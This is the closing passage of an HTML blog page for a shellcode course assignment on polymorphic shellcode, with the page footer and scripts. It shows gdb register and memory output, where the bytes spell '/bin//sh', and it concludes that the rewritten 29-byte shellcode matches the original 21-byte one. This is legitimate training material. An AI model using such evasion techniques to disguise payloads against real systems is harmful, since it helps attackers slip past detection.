+<span class="n">ds</span>             <span class="mh">0x7b</span>	<span class="mi">123</span>
+<span class="n">es</span>             <span class="mh">0x7b</span>	<span class="mi">123</span>
+<span class="n">fs</span>             <span class="mh">0x0</span>	<span class="mi">0</span>
+<span class="n">gs</span>             <span class="mh">0x0</span>	<span class="mi">0</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="mi">12</span><span class="n">bx</span> <span class="mh">0xbffff6e4</span>
+<span class="mh">0xbffff6e4</span><span class="o">:</span>	<span class="mh">0x2f</span>	<span class="mh">0x62</span>	<span class="mh">0x69</span>	<span class="mh">0x6e</span>	<span class="mh">0x2f</span>	<span class="mh">0x2f</span>	<span class="mh">0x73</span>	<span class="mh">0x68</span>
+<span class="mh">0xbffff6ec</span><span class="o">:</span>	<span class="mh">0x00</span>	<span class="mh">0x00</span>	<span class="mh">0x00</span>	<span class="mh">0x00</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span>
+</code></pre></div> <p>After comparing the state of the general purpose registers and values on the stack in both the original shellcode and the polymorphic shellcode, it is evident that all replaced instructions are semantically equivalent and the functionality of the original shellcode is preserved.</p> <p>In addition, the size of the original shellcode is 21 bytes. The size of the polymorphic shellcode is 29 bytes, meeting the size restrictions set by SecurityTube.</p> <div class="entry-meta"> <br> <hr> <span class="entry-tags"><a href="http://localhost:4000/tags/#SLAE" title="Pages tagged SLAE" class="tag"><span class="term">SLAE</span></a><a href="http://localhost:4000/tags/#SecurityTube" title="Pages tagged SecurityTube" class="tag"><span class="term">SecurityTube</span></a><a href="http://localhost:4000/tags/#Assignment" title="Pages tagged Assignment" class="tag"><span class="term">Assignment</span></a><a href="http://localhost:4000/tags/#Shellcode" title="Pages tagged Shellcode" class="tag"><span class="term">Shellcode</span></a><a href="http://localhost:4000/tags/#nasm" title="Pages tagged nasm" class="tag"><span class="term">nasm</span></a><a href="http://localhost:4000/tags/#assembly" title="Pages tagged assembly" class="tag"><span class="term">assembly</span></a><a href="http://localhost:4000/tags/#polymorphic%20shells" title="Pages tagged polymorphic shells" class="tag"><span class="term">polymorphic shells</span></a></span> <span class="social-share"> <a href="https://www.facebook.com/sharer/sharer.php?u=http://localhost:4000/SLAE-Assignment-6/" title="Share on Facebook" class="tag"> <span class="term"><i class="fa fa-facebook-square"></i> Like</span> </a> <a href="https://twitter.com/intent/tweet?text=http://localhost:4000/SLAE-Assignment-6/" title="Share on Twitter" class="tag"> <span class="term"><i class="fa fa-twitter-square"></i> Tweet</span> </a> <a href="https://plus.google.com/share?url=http://localhost:4000/SLAE-Assignment-6/" title="Share on Google+" class="tag"> <span class="term"><i class="fa fa-google-plus-square"></i> +1</span> </a> </span> <div style="clear:both"></div> </div> </div> </div> <section id="disqus_thread" class="animated fadeInUp"></section><!-- /#disqus_thread --> </header> <!-- JS --> <script src="http://localhost:4000/assets/js/jquery-1.12.0.min.js"></script> <script src="http://localhost:4000/assets/js/jquery.dlmenu.min.js"></script> <script src="http://localhost:4000/assets/js/jquery.goup.min.js"></script> <script src="http://localhost:4000/assets/js/jquery.magnific-popup.min.js"></script> <script src="http://localhost:4000/assets/js/jquery.fitvid.min.js"></script> <script src="http://localhost:4000/assets/js/scripts.js"></script> <!-- Asynchronous Google Analytics snippet --> <script> (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){ (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o), m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m) })(window,document,'script','//www.google-analytics.com/analytics.js','ga'); ga('create', 'UA-85516324-1', 'auto'); ga('require', 'linkid', 'linkid.js'); ga('send', 'pageview'); </script> <script type="text/javascript"> var disqus_shortname = 'sanjivkawa'; (function() { var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true; dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js'; (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq); })(); (function () { var s = document.createElement('script'); s.async = true; s.type = 'text/javascript'; s.src = '//' + disqus_shortname + '.disqus.com/count.js'; (document.getElementsByTagName('HEAD')[0] || document.getElementsByTagName('BODY')[0]).appendChild(s); }()); </script> <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+</noscript> <!-- MathJax --> <script async src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script> </body> </html>
